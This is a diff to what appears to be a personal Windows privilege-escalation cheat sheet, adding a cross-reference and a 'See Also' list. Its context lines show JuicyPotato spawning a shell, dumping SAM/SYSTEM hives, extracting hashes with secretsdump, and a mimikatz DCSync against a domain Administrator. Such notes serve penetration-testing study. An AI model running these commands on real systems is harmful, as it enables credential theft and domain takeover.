@@ -88,7 +88,7 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\shell.exe" -t *
 reg save hklm\sam sam.save
 reg save hklm\system system.save
 
-# Extract hashes with secretsdump
+# Extract hashes with secretsdump (see [[Impacket]])
 impacket-secretsdump -sam sam.save -system system.save LOCAL
 ```
 
@@ -231,3 +231,14 @@ lsadump::dcsync /domain:corp.local /user:Administrator
 - [HackTricks Windows PrivEsc](https://book.hacktricks.wiki/windows-hardening/windows-local-privilege-escalation)
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 - [LOLBAS](https://lolbas-project.github.io/)
+
+---
+
+## See Also
+
+- [[Windows_commands_and_concepts]] — Core Windows reference
+- [[AD_Enumeration]] — Domain context once you're SYSTEM
+- [[Kerberos_Attacks]] — Lateral movement after credential dump
+- [[Impacket]] — `secretsdump` for SAM/SYSTEM/NTDS extraction
+- [[File_Transfer]] — Drop WinPEAS / PrintSpoofer onto target
+- [[Shell_Upgrade]] — Stabilise before privesc
